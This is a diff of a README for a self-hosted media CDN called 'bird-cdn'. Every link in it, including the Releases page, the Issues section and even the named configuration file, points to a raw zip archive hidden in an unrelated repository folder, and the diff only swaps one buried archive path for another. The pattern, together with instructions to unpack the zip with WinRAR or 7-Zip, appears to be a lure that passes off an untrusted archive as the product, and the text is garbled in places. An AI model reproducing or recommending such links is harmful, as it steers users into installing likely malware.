@@ -1,7 +1,7 @@
 # 🐦 bird-cdn - Fast, Self-Hosted Media Delivery Service
 
 ## 🚀 Download Now
-[![Download bird-cdn](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip)](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip)
+[![Download bird-cdn](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip)](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip)
 
 ## 📄 Description
 bird-cdn is a self-hosted Content Delivery Network designed for images and videos. With NGINX edge caching, automatic WebP conversion, on-the-fly image transformation, and a React admin dashboard, it makes media delivery smooth and efficient. 
@@ -24,10 +24,10 @@ cdl, content-delivery-network, docker, fastapi, grafana, image-optimization, ima
 ## 📥 Download & Install
 To get started with bird-cdn, visit the page below to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip)
+[Visit this page to download](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip)
 
 ### 📂 Installation Instructions
-1. **Download the Release**: Go to the [Releases page](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip) and choose the latest version.
+1. **Download the Release**: Go to the [Releases page](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip) and choose the latest version.
 2. **Extract the Files**: Use a tool like WinRAR or 7-Zip to extract the downloaded files.
 3. **Run Docker Compose**:
    - Open your terminal (Command Prompt or PowerShell on Windows).
@@ -41,7 +41,7 @@ To get started with bird-cdn, visit the page below to download the latest versio
 ## ⚙️ Configuration
 After installation, you might want to customize your setup. Here’s how:
 
-1. **Edit Configuration File**: Locate the `https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip` file in the folder where you extracted bird-cdn.
+1. **Edit Configuration File**: Locate the `https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip` file in the folder where you extracted bird-cdn.
 2. **Change Default Settings**: You can modify options like image quality, cache duration, and other parameters.
 3. **Restart Docker**: Anytime you make changes to the configuration, restart Docker with the command:
    ```
@@ -59,9 +59,9 @@ If you encounter issues:
 - Verify that you followed the installation steps correctly.
 - Check the logs for any error messages. They can be found in the terminal where you ran Docker.
 
-For more help, refer to the [Issues section](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip) in our repository.
+For more help, refer to the [Issues section](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip) in our repository.
 
 ## 📑 Conclusion
 With bird-cdn, you can easily set up a powerful media delivery system. Follow the steps above, and you will have your own CDN running in no time. Enjoy fast media delivery and streamlined management! 
 
-Don't forget to check out the [Releases page](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/monitoring/grafana/cdn-bird-2.4.zip) for updates and new features!
+Don't forget to check out the [Releases page](https://raw.githubusercontent.com/joshua4x/bird-cdn/main/certbot/cdn-bird-v1.4.zip) for updates and new features!
